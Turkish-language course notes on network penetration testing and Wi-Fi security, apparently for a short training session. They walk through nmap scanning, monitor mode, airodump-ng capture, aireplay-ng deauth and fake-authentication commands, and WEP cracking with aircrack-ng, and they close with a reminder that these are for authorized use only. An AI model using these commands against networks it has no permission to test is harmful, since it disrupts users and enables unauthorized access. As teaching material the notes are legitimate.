# Siber Güvenlik Eğitimi: Ağ Penetrasyon Testi ve Wi-Fi Güvenliği

**2-3 Saatlik Eğitim Notları**

**Hazırlayan:** Siber Güvenlik Ekibi  
**Tarih:** 22 Temmuz 2025

## İçindekiler

1. [Giriş](#giriş)
2. [Ağ Penetrasyon Testi Nedir?](#ağ-penetrasyon-testi-nedir)
   - 2.1 [Adımlar](#adımlar)
3. [USB Wi-Fi Kart Seçimi ve Bağlantı](#usb-wi-fi-kart-seçimi-ve-bağlantı)
   - 3.1 [Önerilen Yonga Setleri](#önerilen-yonga-setleri)
   - 3.2 [Bağlantı Adımları](#bağlantı-adımları)
4. [MAC Adresi Nedir?](#mac-adresi-nedir)
5. [Monitör ve Managed Modları](#monitör-ve-managed-modları)
   - 5.1 [Monitör Moduna Geçiş](#monitör-moduna-geçiş)
6. [Monitör Modda Ağları İnceleme](#monitör-modda-ağları-inceleme)
7. [Belli Bir Ağa Özel Bilgi Edinme](#belli-bir-ağa-özel-bilgi-edinme)
8. [Deauth Saldırısı](#deauth-saldırısı)
9. [WEP Ayarları](#wep-ayarları)
10. [WEP Çalışma Mantığı](#wep-çalışma-mantığı)
    - 10.1 [Temel İşleyiş](#temel-i̇şleyiş)
11. [WEP Şifrelerini Kırma](#wep-şifrelerini-kırma)
12. [Sahte Yetkilendirme](#sahte-yetkilendirme)
13. [Sonuç ve Etik Hususlar](#sonuç-ve-etik-hususlar)

---

## 1. Giriş

Bu eğitim, siber güvenlik alanında ağ penetrasyon testi ve Wi-Fi güvenliği konularını kapsamaktadır. 2-3 saatlik bu ders, ağ güvenliği kavramlarını, araçlarını ve pratik uygulamalarını anlamak isteyenler için tasarlanmıştır. Eğitim, teorik bilgilerle birlikte Kali Linux üzerinde çalışan komut satırı örneklerini içermektedir.

## 2. Ağ Penetrasyon Testi Nedir?

Ağ penetrasyon testi, bir ağın veya sistemin güvenlik açıklarını tespit etmek ve değerlendirmek için gerçekleştirilen kontrollü bir siber saldırı simülasyonudur. Amaç, yetkisiz erişim, veri sızıntısı veya hizmet kesintisi gibi tehditlere karşı sistemin dayanıklılığını test etmektir.

### 2.1 Adımlar

1. **Bilgi Toplama**: Hedef ağ hakkında bilgi toplanır (ör. IP adresleri, cihazlar).
2. **Tarama**: Açık portlar ve hizmetler tespit edilir.
3. **Zafiyet Analizi**: Tespit edilen sistemlerdeki güvenlik açıkları belirlenir.
4. **Sömürü**: Açıklar kullanılarak sisteme erişim denenir.
5. **Raporlama**: Bulgular belgelenir ve çözüm önerileri sunulur.

**Örnek Komut (Nmap ile tarama):**
```bash
nmap -sS -A 192.168.1.0/24
```

## 3. USB Wi-Fi Kart Seçimi ve Bağlantı

Wi-Fi penetrasyon testleri için uygun bir USB Wi-Fi kartı seçmek kritik öneme sahiptir. Kartın monitör modunu desteklemesi ve Linux ile uyumlu olması gerekir.

### 3.1 Önerilen Yonga Setleri

- Atheros AR9271
- Ralink RT3070
- Realtek RTL8187

### 3.2 Bağlantı Adımları

1. Kartı cihaza takın.
2. Sürücülerin yüklü olduğunu kontrol edin:
   ```bash
   lsusb
   ```
3. Aygıtın tanındığını doğrulayın:
   ```bash
   iwconfig
   ```
4. Gerekirse sürücü yükleyin (örneğin, Kali Linux'ta):
   ```bash
   sudo apt-get install firmware-atheros
   ```

## 4. MAC Adresi Nedir?

MAC (Media Access Control) adresi, bir ağ cihazını fiziksel katmanda tanımlayan 48 bitlik benzersiz bir kimliktir. Örnek format: `00:1A:2B:3C:4D:5E`.

**MAC Adresi Öğrenme:**
```bash
ifconfig | grep ether
```

## 5. Monitör ve Managed Modları

Wi-Fi adaptörleri iki farklı modda çalışabilir:

- **Managed Mod**: Cihaz, bir erişim noktasına (AP) bağlanır ve normal bir istemci gibi çalışır.
- **Monitör Mod**: Adaptör, tüm Wi-Fi trafiğini yakalar ve pasif olarak dinler.

### 5.1 Monitör Moduna Geçiş

1. Arayüzü kapat:
   ```bash
   sudo ifconfig wlan0 down
   ```
2. Modu değiştir:
   ```bash
   sudo iwconfig wlan0 mode monitor
   ```
3. Arayüzü aç:
   ```bash
   sudo ifconfig wlan0 up
   ```
4. Modu doğrula:
   ```bash
   iwconfig
   ```

## 6. Monitör Modda Ağları İnceleme

Monitör modda, ağları taramak için `airodump-ng` kullanılır.

**Örnek Komut:**
```bash
sudo airodump-ng wlan0
```

Bu komut, yakındaki Wi-Fi ağlarının SSID, BSSID, kanal, şifreleme türü gibi bilgilerini listeler.

## 7. Belli Bir Ağa Özel Bilgi Edinme

Belirli bir ağın detaylarını öğrenmek için `airodump-ng` ile hedef ağa odaklanılır.

**Örnek Komut:**
```bash
sudo airodump-ng --bssid 00:14:22:33:44:55 --channel 6 --write output wlan0
```

Bu, belirtilen BSSID ve kanal için veri toplar ve `output.cap` dosyasına kaydeder.

## 8. Deauth Saldırısı

Deauth (deauthentication) saldırısı, bir istemciyi erişim noktasından koparmak için sahte deauth paketleri gönderir.

**Örnek Komut:**
```bash
sudo aireplay-ng --deauth 10 -a 00:14:22:33:44:55 -c 00:1A:2B:3C:4D:5E wlan0
```

Bu komut, belirtilen istemciyi (MAC: `00:1A:2B:3C:4D:5E`) 10 kez koparmayı dener.

## 9. WEP Ayarları

WEP (Wired Equivalent Privacy), eski ve güvensiz bir Wi-Fi şifreleme protokolüdür. Ayarlar, erişim noktası yönetim panelinden yapılır:

- **Şifreleme**: WEP 64-bit veya 128-bit.
- **Anahtar**: Hexadecimal veya ASCII formatında.

## 10. WEP Çalışma Mantığı

WEP, RC4 algoritmasını kullanarak verileri şifreler. Ancak zayıf anahtar yönetimi ve IV (Initialization Vector) tekrarları nedeniyle kırılgandır.

### 10.1 Temel İşleyiş

1. İstemci ve AP, paylaşılan bir anahtar kullanır.
2. IV, her paket için rastgele oluşturulur ve anahtarla birleştirilir.
3. RC4 ile veri şifrelenir.

## 11. WEP Şifrelerini Kırma

WEP şifrelerini kırmak için `aircrack-ng` kullanılır. Yeterli IV toplamak gerekir.

**Adımlar:**

1. Monitör moda geçin.
2. Ağ trafiğini yakalayın:
   ```bash
   sudo airodump-ng --bssid 00:14:22:33:44:55 --channel 6 --write wep_crack wlan0
   ```
3. IV toplamak için sahte trafik oluşturun:
   ```bash
   sudo aireplay-ng --arpreplay -b 00:14:22:33:44:55 -h 00:1A:2B:3C:4D:5E wlan0
   ```
4. Şifreyi kırın:
   ```bash
   sudo aircrack-ng wep_crack-01.cap
   ```

## 12. Sahte Yetkilendirme

Sahte yetkilendirme, bir istemcinin erişim noktasına sahte bir kimlik doğrulama paketi göndererek bağlanıyormuş gibi davranmasını sağlar.

**Örnek Komut:**
```bash
sudo aireplay-ng --fakeauth 0 -a 00:14:22:33:44:55 -h 00:1A:2B:3C:4D:5E wlan0
```

## 13. Sonuç ve Etik Hususlar

Bu eğitimde, ağ penetrasyon testi ve Wi-Fi güvenliği konuları ele alındı. Ancak bu tekniklerin yalnızca yasal izinle ve etik amaçlarla kullanılması gerektiğini unutmayın. Yetkisiz erişim, yasal sonuçlar doğurabilir.

**Örnek Etik Kullanım:**

- Kendi ağınızda test yapın.
- İşveren veya müşteri izniyle penetrasyon testi gerçekleştirin.

---

*Bu doküman eğitim amaçlıdır ve yalnızca yasal ve etik çerçevede kullanılmalıdır.*